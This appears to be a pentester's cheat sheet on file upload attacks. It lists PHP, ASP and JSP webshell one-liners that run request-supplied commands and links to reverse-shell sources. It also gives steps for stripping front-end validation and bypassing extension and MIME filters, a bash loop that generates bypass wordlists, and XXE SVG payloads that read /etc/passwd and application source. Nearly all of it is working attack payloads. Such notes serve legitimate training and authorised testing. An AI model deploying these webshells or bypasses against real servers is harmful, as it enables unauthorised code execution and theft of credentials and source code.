
> [!NOTE] Important
> Fuzzing allowed file extensions is an important exercise for any file upload attack. It enables us to explore what attacks may be achievable on the web server. So, let's explore some of these attacks.


PHP Webshell
```php
<?php echo "Pwn3d!";?>
<?php system($_GET['cmd']) ?> 
<?php system($_REQUEST['cmd']) ?> 
<?php system("ping -c 5 10.10.14.6") ?> 
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
```
ASP Webshell
```asp
<% eval request('cmd') %>
```
JSP Websell
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
Reverse Shells
https://www.revshells.com/
https://github.com/pentestmonkey/php-reverse-shell
https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx

### Disabling Front-end Validation
Check source code with page inspector and look for something like the following:
```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">

<form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm" onSubmit="if(validate()){upload()}">
```
Delete the lines of code that are performing the validation `checkFile(this)` `accept=".jpg,.jpeg,.png"`

> [!NOTE] Note
> We can check the contents of the Javascript function `checkFile()` by going into the web console [CTRL+SHIFT+K] and typing in `checkFile`

### Blacklist Bypass
Fuzz which extensions are allowed using Burp Intruder and Sniper. 
Review which extensions get denied via error message or content length
```shell
~/opt/wordlists/php-ext.txt

<?php system("id") ?>
```

> [!NOTE] Note
> Try with and without URL encoding
### Whitelist Bypass
Double extensions and reverse extensions can be used (`.php.jpg`).
Special characters like null bytes `%00` can be used to make the application misread the file extension and allow the file to be uploaded.

> [!NOTE] Note
> `:` seems to work very well with IIS servers i.e. `shell.aspx:.jpg`

Bash script for adding special characters and double extensions to wordlist
```shell
for char in "%20" "%0a" "%00" "%0d0a" "/" '.\\' "." "..." ":"; do
    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm' ; do
        echo "$char$ext.jpg" >> php-ext-bypass.txt
        echo "$ext$char.jpg" >> php-ext-bypass.txt
        echo ".jpg$char$ext" >> php-ext-bypass.txt
        echo ".jpg$ext$char" >> php-ext-bypass.txt
    done
done
```
1. Fuzz double extensions
2. Fuzz with null-bytes / special characters (don't forget to URL encode them when executing)
### Type Filters (magic byte)
1. Fuzz the **content type** using the `image-content-types.txt` wordlist in Burp Intruder
2. Bypass the MIME filter by adding `GIF8` or `Â‰.PNG...` before the payload

We can try using an `Allowed MIME type with a disallowed Content-Type`, an `Allowed MIME/Content-Type with a disallowed extension`, or a `Disallowed MIME/Content-Type with an allowed extension`, and so on

### Read Source Code w/ XXE
Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server.

> [!NOTE] Note
> This can be very useful for reading source code to find more hidden directories, embedded SQL passwords, API keys and more 


Read the contents of `/etc/passwd` using a malicious SVG image
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
Read source code of web application
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
